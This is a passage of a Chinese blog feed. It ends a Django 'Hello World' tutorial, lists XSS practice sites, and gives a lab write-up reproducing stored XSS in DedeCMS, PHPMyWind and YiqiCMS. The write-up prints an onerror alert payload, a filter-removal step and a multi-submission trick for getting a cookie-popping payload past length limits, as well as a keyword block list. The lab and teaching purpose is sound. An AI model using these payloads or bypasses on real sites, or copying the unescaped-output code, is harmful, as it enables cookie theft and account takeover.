class="s">'django.contrib.sessions'</span><span class="p">,</span>    <span class="s">'django.contrib.messages'</span><span class="p">,</span>    <span class="s">'django.contrib.staticfiles'</span><span class="p">,</span>   <span class="s">'boards',# 译者注：建议和作者一样空一行来区别内置app和自定义的app</span><span class="p">,</span><span class="p">]</span></code></pre></figure><p>使用前面漫画正方形和圆圈的比喻，黄色的圆圈就是我们的boards应用程序，<strong>django.contrib.admin, django.contrib.auth</strong>等就是红色的圆圈。</p><h2 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h2><p>现在来写我们的第一个视图(view)，试试看看如何用Django创建一个新页面。</p><p>打开boards应用程序中的views.py文件，并添加以下代码：</p><p><strong>views.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">'Hello, World!'</span>)</span><br></pre></td></tr></table></figure><p>视图是接收<code>httprequest</code>对象并返回一个<code>httpresponse</code>对象的Python函数。接收 <em>request<em>作为参数并返回</em>response</em> 作为结果。这个流程你必须记住！</p><p>上面定义了一个简单的视图，命名为<strong>home</strong>,它简单返回一个信息字符串hello,world!</p><p>Django调用这个view。是在<strong>urls.py</strong>文件中完成：</p><p><strong>urls.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.conf.urls <span class="keyword">import</span> url</span><br><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> boards <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    url(<span class="string">r'^$'</span>,views.home,name=<span class="string">'home'</span>),</span><br><span class="line">    url(<span class="string">r'^admin/'</span>,admin.site.urls),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>将上面的代码片段与你的<strong>urls.py</strong>文件进行比较，你会注意到我添加了以下新代码：<code>url（r&#39;^ $&#39;，views.home，name =&#39;home&#39;</code>，并通过<code>from boards import views</code>从我们的应用程序<strong>boards</strong>中导入了<strong>views</strong>模块</p><p>Django使用<strong>正则表达式</strong>来匹配请求的URL，对于我们的<strong>home</strong>视图，我使用<code>^$</code>正则，它将匹配一个空路径，也就是主页（这个URL：<code>http://127.0.0.1:8000</code>）。如果我想匹配的URL是 <code>http://127.0.0.1:8000/homepage/</code>，那么我的URL正则表达式就会是：<code>url(r&#39;^homepage/$&#39;, views.home, name=&#39;home&#39;)</code>。</p><p>回到manage.py目录，运行</p><p>python manage.py runserver</p><p>并在Web浏览器中，打开 <strong><code>http://127.0.0.1:8000</code></strong></p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20420django11.png" alt=""></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这是本系列学习的第一部分。本文，学习了如何安装相应的Python版本以及如何设置开发环境。还介绍了虚拟环境，开始了第一个django项目，并已经创建了我们的初始应用程序。</p><p>下部分将学习它的模型，视图，模板和URLs。学习探索Django所有的基础知识！</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> Web框架 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> Web框架 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【XSS（一）】1.4 XSS相关资料搜集</title>
      <link href="/2020/04/16/1.4%20XSS%E7%9B%B8%E5%85%B3%E8%B5%84%E6%96%99%E6%90%9C%E9%9B%86/"/>
      <url>/2020/04/16/1.4%20XSS%E7%9B%B8%E5%85%B3%E8%B5%84%E6%96%99%E6%90%9C%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<p>本文主要是一些XSS练习平台、XSS相关知识、或者总结的参考资料搜集。。。</p><a id="more"></a><h3 id="XSS总结"><a href="#XSS总结" class="headerlink" title="XSS总结"></a>XSS总结</h3><p>参考链接：</p><ul><li>【xss总结】<a href="https://xz.aliyun.com/t/4067#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/4067#toc-0</a></li><li><a href="https://html5sec.org/" target="_blank" rel="noopener">https://html5sec.org/</a></li><li>【xss总结】<a href="https://blog.csdn.net/qq_29277155/article/details/51320064" target="_blank" rel="noopener">https://blog.csdn.net/qq_29277155/article/details/51320064</a></li><li>【xss-payload】<a href="https://owasp.org/www-community/xss-filter-evasion-cheatsheet" target="_blank" rel="noopener">https://owasp.org/www-community/xss-filter-evasion-cheatsheet</a></li></ul><h3 id="XSS练习平台1"><a href="#XSS练习平台1" class="headerlink" title="XSS练习平台1"></a>XSS练习平台1</h3><ul><li>参考网址：<a href="http://test.ctf8.com/" target="_blank" rel="noopener">http://test.ctf8.com/</a></li><li>参考答案：<ul><li><a href="https://blog.csdn.net/tutucoo/article/details/104151403" target="_blank" rel="noopener">https://blog.csdn.net/tutucoo/article/details/104151403</a></li><li><a href="https://www.cnblogs.com/bmjoker/p/9446472.html" target="_blank" rel="noopener">https://www.cnblogs.com/bmjoker/p/9446472.html</a></li></ul></li></ul><h3 id="XSS练习平台2"><a href="#XSS练习平台2" class="headerlink" title="XSS练习平台2"></a>XSS练习平台2</h3><ul><li><p>链接地址：<a href="http://xss-quiz.int21h.jp/" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/</a></p></li><li><p>参考答案：<a href="https://blog.csdn.net/taozijun/article/details/81277187" target="_blank" rel="noopener">https://blog.csdn.net/taozijun/article/details/81277187</a></p></li></ul><h3 id="XSS练习平台3"><a href="#XSS练习平台3" class="headerlink" title="XSS练习平台3"></a>XSS练习平台3</h3><ul><li><p>链接地址：<a href="http://prompt.ml/0" target="_blank" rel="noopener">http://prompt.ml/0</a></p></li><li><p>参考答案：</p><ul><li><a href="https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml" target="_blank" rel="noopener">https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml</a></li><li><a href="https://blog.csdn.net/Ni9htMar3/article/details/77938899" target="_blank" rel="noopener">https://blog.csdn.net/Ni9htMar3/article/details/77938899</a></li></ul></li></ul><h3 id="XSS练习平台4"><a href="#XSS练习平台4" class="headerlink" title="XSS练习平台4"></a>XSS练习平台4</h3><ul><li><p>链接地址：<a href="https://alf.nu/alert1" target="_blank" rel="noopener">https://alf.nu/alert1</a></p></li><li><p>参考答案：<a href="https://www.cnblogs.com/omnis/p/9084461.html" target="_blank" rel="noopener">https://www.cnblogs.com/omnis/p/9084461.html</a></p></li></ul><h3 id="待续………"><a href="#待续………" class="headerlink" title="待续………"></a>待续………</h3>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【XSS（一）】1.3 存储型XSS多场景实践及绕过</title>
      <link href="/2020/04/16/1.3%20%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E5%A4%9A%E5%9C%BA%E6%99%AF%E5%AE%9E%E8%B7%B5%E5%8F%8ABypass/"/>
      <url>/2020/04/16/1.3%20%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E5%A4%9A%E5%9C%BA%E6%99%AF%E5%AE%9E%E8%B7%B5%E5%8F%8ABypass/</url>
      
        <content type="html"><![CDATA[<p>本文选取了DedeCMS_v5.7（存储型XSS）、phpmywind5.3（存储型XSS,编辑后触发）、Yiqicms1.9（存储型XSS,多次提交绕过)等进行了环境的复现、漏洞的绕过、漏洞的验证、漏洞的简单修复、及利用</p><a id="more"></a><h2 id="0x01-存储型XSS"><a href="#0x01-存储型XSS" class="headerlink" title="0x01 存储型XSS"></a>0x01 存储型XSS</h2><h3 id="1-1-DedeCMS-v5-7"><a href="#1-1-DedeCMS-v5-7" class="headerlink" title="1.1 DedeCMS_v5.7"></a>1.1 DedeCMS_v5.7</h3><ul><li><p>下载地址：</p><p>  链接：<a href="https://pan.baidu.com/s/116RsJoRbQ9rpVaq_64QUqA" target="_blank" rel="noopener">https://pan.baidu.com/s/116RsJoRbQ9rpVaq_64QUqA</a><br>  提取码：eiuo</p></li><li><p>本地环境配置</p><p>  windows+phpstudy+php5.4.45</p><p>  将下载后的软件放于WWW目录下,按步骤安装即可</p></li><li><p>测试说明</p><ul><li>上述下载的版本存在的XSS漏洞以及修复，但是亦可能存在未发现的XSS漏洞，此博文为了理解XSS原理，以便自身对XSS测试思路理解</li><li>在已修复状态下，复现漏洞环境，并分析修复代码</li></ul></li><li><p>复现的漏洞要求：</p><p>  该漏洞 通过用户在编写订单收货地址的相关参数 注入 XSS Payload，导致 前台查看订单的页面和后台管理员查看订单详情的页面都会被 XSS。<br>  所以说，可以用来打管理员 Cookie 。</p></li><li><p>准备：</p><p>  1.首先管理员登录后台/dede，添加商品销售栏目<img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20415xss01.png" alt=""><br>  2.为商品栏目添加一个商品 <img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20415xss02.png" alt=""></p></li><li><p>前台用户选定商品添加购物车：（这里方便测试，选定admin用户）<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20415xss03.png" alt=""></p></li><li><p>前台用户编辑订单的收货地址，在这里 address,des,email,postname 都是存在 XSS 的，插入 XSS Payload<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20415xss04.png" alt=""></p></li><li><p>查看订单详情，发现插入的XSS Payload都被过滤(说明在提交订单后，对订单内容进行了XSS过滤)<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20415xss05.png" alt=""></p></li><li><p>由于订单页面：carbuyaction.php，本地文件查看找到如下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$address     = cn_substrR(trim(RemoveXSS($address)),<span class="number">200</span>);</span><br><span class="line">$des             = cn_substrR(RemoveXSS($des),<span class="number">100</span>);</span><br><span class="line">$postname = cn_substrR(trim(RemoveXSS($postname)),<span class="number">15</span>);</span><br><span class="line">$tel            = preg_replace(<span class="string">"#[^-0-9,\/\| ]#"</span>, <span class="string">""</span>, $tel);</span><br><span class="line">$zip            = preg_replace(<span class="string">"#[^0-9]#"</span>, <span class="string">""</span>, $zip);</span><br><span class="line">$email        = cn_substrR(RemoveXSS($email),<span class="number">255</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($tel))</span><br></pre></td></tr></table></figure><p>  分析：这段代码分别进行了，RemoveXSS、trim、cn_substrR等相应处理，先将地址的RemoveXSS函数过滤去掉，再进行XSS payload提交</p></li><li><p>再次，提交商品，查看提交XSS payload的订单详情<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20415xss06.png" alt=""></p><p>  分析：发现未使用RemoveXSS函数过滤时，地址存在XSS漏洞</p></li><li><p>查看后台管理员中，商品订单记录<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20415xss07.png" alt=""></p></li><li><p>RemoveXSS函数查找</p><p> 添加如下代码放置对应文件中(carbuyaction.php）,重新提交订单，即可显示函数具体位置</p><p>  //测试RemoveXSS位置<br>  $func = new ReflectionFunction(‘RemoveXSS’);<br>   var_dump($func-&gt;getFileName());</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20415xss09.png" alt=""></p><ul><li><p>查找结果<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20415xss08.png" alt=""></p></li><li><p>RemoveXSS代码如下：</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">RemoveXSS</span><span class="params">($val)</span> </span>&#123;</span><br><span class="line">   $val = preg_replace(<span class="string">'/([\x00-\x08,\x0b-\x0c,\x0e-\x19])/'</span>, <span class="string">''</span>, $val);</span><br><span class="line">   $search = <span class="string">'abcdefghijklmnopqrstuvwxyz'</span>;</span><br><span class="line">   $search .= <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>;</span><br><span class="line">   $search .= <span class="string">'1234567890!@#$%^&amp;*()'</span>;</span><br><span class="line">   $search .= <span class="string">'~`";:?+/=&#123;&#125;[]-_|\'\\'</span>;</span><br><span class="line">   <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($search); $i++) &#123;</span><br><span class="line">      $val = preg_replace(<span class="string">'/(&amp;#[xX]0&#123;0,8&#125;'</span>.dechex(ord($search[$i])).<span class="string">';?)/i'</span>, $search[$i], $val); <span class="comment">// with a ;</span></span><br><span class="line">      $val = preg_replace(<span class="string">'/(&amp;#0&#123;0,8&#125;'</span>.ord($search[$i]).<span class="string">';?)/'</span>, $search[$i], $val); <span class="comment">// with a ;</span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   $ra1 = <span class="keyword">array</span>(<span class="string">'javascript'</span>, <span class="string">'vbscript'</span>, <span class="string">'expression'</span>, <span class="string">'applet'</span>, <span class="string">'meta'</span>, <span class="string">'xml'</span>, <span class="string">'blink'</span>, <span class="string">'link'</span>, <span class="string">'style'</span>, <span class="string">'script'</span>, <span class="string">'embed'</span>, <span class="string">'object'</span>, <span class="string">'iframe'</span>, <span class="string">'frame'</span>, <span class="string">'frameset'</span>, <span class="string">'ilayer'</span>, <span class="string">'layer'</span>, <span class="string">'bgsound'</span>, <span class="string">'title'</span>, <span class="string">'base'</span>);</span><br><span class="line">   $ra2 = <span class="keyword">array</span>(<span class="string">'onabort'</span>, <span class="string">'onactivate'</span>, <span class="string">'onafterprint'</span>, <span class="string">'onafterupdate'</span>, <span class="string">'onbeforeactivate'</span>, <span class="string">'onbeforecopy'</span>, <span class="string">'onbeforecut'</span>, <span class="string">'onbeforedeactivate'</span>, <span class="string">'onbeforeeditfocus'</span>, <span class="string">'onbeforepaste'</span>, <span class="string">'onbeforeprint'</span>, <span class="string">'onbeforeunload'</span>, <span class="string">'onbeforeupdate'</span>, <span class="string">'onblur'</span>, <span class="string">'onbounce'</span>, <span class="string">'oncellchange'</span>, <span class="string">'onchange'</span>, <span class="string">'onclick'</span>, <span class="string">'oncontextmenu'</span>, <span class="string">'oncontrolselect'</span>, <span class="string">'oncopy'</span>, <span class="string">'oncut'</span>, <span class="string">'ondataavailable'</span>, <span class="string">'ondatasetchanged'</span>, <span class="string">'ondatasetcomplete'</span>, <span class="string">'ondblclick'</span>, <span class="string">'ondeactivate'</span>, <span class="string">'ondrag'</span>, <span class="string">'ondragend'</span>, <span class="string">'ondragenter'</span>, <span class="string">'ondragleave'</span>, <span class="string">'ondragover'</span>, <span class="string">'ondragstart'</span>, <span class="string">'ondrop'</span>, <span class="string">'onerror'</span>, <span class="string">'onerrorupdate'</span>, <span class="string">'onfilterchange'</span>, <span class="string">'onfinish'</span>, <span class="string">'onfocus'</span>, <span class="string">'onfocusin'</span>, <span class="string">'onfocusout'</span>, <span class="string">'onhelp'</span>, <span class="string">'onkeydown'</span>, <span class="string">'onkeypress'</span>, <span class="string">'onkeyup'</span>, <span class="string">'onlayoutcomplete'</span>, <span class="string">'onload'</span>, <span class="string">'onlosecapture'</span>, <span class="string">'onmousedown'</span>, <span class="string">'onmouseenter'</span>, <span class="string">'onmouseleave'</span>, <span class="string">'onmousemove'</span>, <span class="string">'onmouseout'</span>, <span class="string">'onmouseover'</span>, <span class="string">'onmouseup'</span>, <span class="string">'onmousewheel'</span>, <span class="string">'onmove'</span>, <span class="string">'onmoveend'</span>, <span class="string">'onmovestart'</span>, <span class="string">'onpaste'</span>, <span class="string">'onpropertychange'</span>, <span class="string">'onreadystatechange'</span>, <span class="string">'onreset'</span>, <span class="string">'onresize'</span>, <span class="string">'onresizeend'</span>, <span class="string">'onresizestart'</span>, <span class="string">'onrowenter'</span>, <span class="string">'onrowexit'</span>, <span class="string">'onrowsdelete'</span>, <span class="string">'onrowsinserted'</span>, <span class="string">'onscroll'</span>, <span class="string">'onselect'</span>, <span class="string">'onselectionchange'</span>, <span class="string">'onselectstart'</span>, <span class="string">'onstart'</span>, <span class="string">'onstop'</span>, <span class="string">'onsubmit'</span>, <span class="string">'onunload'</span>);</span><br><span class="line">   $ra = array_merge($ra1, $ra2);</span><br><span class="line"></span><br><span class="line">   $found = <span class="keyword">true</span>; </span><br><span class="line">   <span class="keyword">while</span> ($found == <span class="keyword">true</span>) &#123;</span><br><span class="line">      $val_before = $val;</span><br><span class="line">      <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; sizeof($ra); $i++) &#123;</span><br><span class="line">         $pattern = <span class="string">'/'</span>;</span><br><span class="line">         <span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; strlen($ra[$i]); $j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($j &gt; <span class="number">0</span>) &#123;</span><br><span class="line">               $pattern .= <span class="string">'('</span>;</span><br><span class="line">               $pattern .= <span class="string">'(&amp;#[xX]0&#123;0,8&#125;([9ab]);)'</span>;</span><br><span class="line">               $pattern .= <span class="string">'|'</span>;</span><br><span class="line">               $pattern .= <span class="string">'|(&amp;#0&#123;0,8&#125;([9|10|13]);)'</span>;</span><br><span class="line">               $pattern .= <span class="string">')*'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $pattern .= $ra[$i][$j];</span><br><span class="line">         &#125;</span><br><span class="line">         $pattern .= <span class="string">'/i'</span>;</span><br><span class="line">         $replacement = substr($ra[$i], <span class="number">0</span>, <span class="number">2</span>).<span class="string">'&lt;x&gt;'</span>.substr($ra[$i], <span class="number">2</span>);</span><br><span class="line">         $val = preg_replace($pattern, $replacement, $val); </span><br><span class="line">         <span class="keyword">if</span> ($val_before == $val) &#123;</span><br><span class="line">            $found = <span class="keyword">false</span>;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> $val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-2-PHPMyWind-5-3"><a href="#1-2-PHPMyWind-5-3" class="headerlink" title="1.2 PHPMyWind_5.3"></a>1.2 PHPMyWind_5.3</h3><ul><li><p>下载地址：</p><p>  链接：<a href="https://pan.baidu.com/s/1ujXDwr4KOcd1iwbtJlnhEg" target="_blank" rel="noopener">https://pan.baidu.com/s/1ujXDwr4KOcd1iwbtJlnhEg</a><br>  提取码：3n1n</p></li><li><p>采用字符串<font size=4 color=#FF0000>6666”;!–’<XSS>=&amp;{()}&lt;&gt;6666</font>`作为简洁探测XSS注入点。注入后查看页面源代码并且寻找是否存在<code>666&amp;quot;</code>等字样来确认是否存在漏洞</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20415xss10.png" alt=""></p><ul><li>后台查看留言模块，对留言进行修改</li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20415xss11.png" alt=""></p><ul><li>审查留言，右键点击框架源代码，并搜索6666查看输入位置，并分析</li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20415xss12.png" alt=""></p><pre><code>分析：过滤了双引号，左右尖括号</code></pre><ul><li><p>查看本地文件，(message.php)，找到如下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$contact  = htmlspecialchars($contact);</span><br><span class="line">$content  = htmlspecialchars($content);</span><br></pre></td></tr></table></figure><p>分析：可知对输入内容利用<font color=#FF0000 size=4>htmlspecialchars</font>进行了HTML实体转换</p></li><li><p>跟进content参数。PHPMyWind_5.3/admin/message_update.php</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;title&gt;修改留言&lt;/title&gt;</span><br><span class="line">&lt;link href=<span class="string">"templates/style/admin.css"</span> rel=<span class="string">"stylesheet"</span> type=<span class="string">"text/css"</span> /&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"templates/js/jquery.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"templates/js/checkf.func.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"editor/kindeditor-min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"editor/lang/zh_CN.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$row = $dosql-&gt;GetOne(<span class="string">"SELECT * FROM `#@__message` WHERE `id`=$id"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;div class="formHeader"&gt; &lt;span class="title"&gt;修改留言&lt;/span&gt; &lt;a href="javascript:location.reload();" class="reload"&gt;刷新&lt;/a&gt; &lt;/div&gt;</span><br><span class="line">&lt;form name=<span class="string">"form"</span> id=<span class="string">"form"</span> method=<span class="string">"post"</span> action=<span class="string">"message_save.php"</span>&gt;</span><br><span class="line">    &lt;table width="100%" border="0" cellspacing="0" cellpadding="0" class="formTable"&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td width=<span class="string">"25%"</span> height=<span class="string">"40"</span> align=<span class="string">"right"</span>&gt;用户名：&lt;/td&gt;</span><br><span class="line">            &lt;td width=<span class="string">"75%"</span>&gt;&lt;strong&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $row[<span class="string">'nickname'</span>] <span class="meta">?&gt;</span>&lt;/strong&gt;&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td height=<span class="string">"40"</span> align=<span class="string">"right"</span>&gt;联系方式：&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;input type="text" name="contact" id="contact" class="input" value="&lt;?php echo $row['contact'] ?&gt;" /&gt;&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td height=<span class="string">"198"</span> align=<span class="string">"right"</span>&gt;留言内容：&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;textarea name=<span class="string">"content"</span> id=<span class="string">"content"</span>&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $row[<span class="string">'content'</span>] <span class="meta">?&gt;</span>&lt;/textarea&gt;</span><br><span class="line">                &lt;script&gt;</span><br></pre></td></tr></table></figure><ul><li><p>这行代码<code>&lt;td&gt;&lt;textarea name=&quot;content&quot; id=&quot;content&quot;&gt;&lt;?php echo $row[&#39;content&#39;] ?&gt;&lt;/textarea&gt;</code>后台直接取出content参数,数据并未进行转义操作。<br>PHPMyWind_5.3/shoppingcart.php 留言板地址<br>以ing开头(可以是其他)</p></li><li><p>构造XSS payload：<code>&quot;&gt;&lt;img src=x onerror=alert(2001)&gt;&lt;&quot;</code>也即注入留言内容中</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20415xss15.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20415xss14.png" alt=""></p><h3 id="1-3-yiqicms-v1-9-20150904"><a href="#1-3-yiqicms-v1-9-20150904" class="headerlink" title="1.3 yiqicms-v1.9-20150904"></a>1.3 yiqicms-v1.9-20150904</h3><ul><li><p>下载链接</p><p>  链接：<a href="https://pan.baidu.com/s/1yGBVYMzt8SSXLum2ykcEaA" target="_blank" rel="noopener">https://pan.baidu.com/s/1yGBVYMzt8SSXLum2ykcEaA</a><br>提取码：4q0a </p></li></ul><ul><li>前期XSS注入点探测省略，直接对留言标题进行XSS payload提交</li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20415xss16.png" alt=""></p><ul><li>后台查看在线留言列表，弹出1,留言详情查看也会弹出1，F12审查元素</li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20415xss17.png" alt=""><br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20415xss18.png" alt=""></p><ul><li><p>但是在利用的过程中如果是弹出cookie的话，发现有长度限制，尝试是否可以通过多次提交，使用/    /的方式绕过。</p><ul><li>第一次提交：<img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20415xss19.png" alt=""></li><li>第二次提交：<img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20415xss20.png" alt=""></li></ul></li><li><p>查看留言列表，成功弹窗cookie信息，F12审查元素</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20415xss21.png" alt=""></p><ul><li><p>综上更多的利用方式，亦可以在一定长度下进行多次提交，巧妙利用注释</p></li><li><p>审查comment.php,对输入信息仅进行了长度限制</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/^.&#123;1,30&#125;$/"</span>,$msgtitle))</span><br><span class="line">    &#123;</span><br><span class="line">        ShowMsg(<span class="string">"请输入正确的标题"</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/^.&#123;1,10&#125;$/"</span>,$msgname))</span><br><span class="line">    &#123;</span><br><span class="line">        ShowMsg(<span class="string">"请输入您的姓名"</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/^.&#123;1,20&#125;$/"</span>,$msgcontact))</span><br><span class="line">    &#123;</span><br><span class="line">        ShowMsg(<span class="string">"请输入正确的联系方式"</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/^.&#123;1,200&#125;$/"</span>,$msgcontent))</span><br><span class="line">    &#123;</span><br><span class="line">        ShowMsg(<span class="string">"请输入正确的留言内容"</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $msgcontent = safeCheck($msgcontent);</span><br><span class="line"></span><br><span class="line">    $userip = $_SERVER[<span class="string">"REMOTE_ADDR"</span>];;</span><br><span class="line">    $sql = <span class="string">"INSERT INTO yiqi_comments (cid ,title 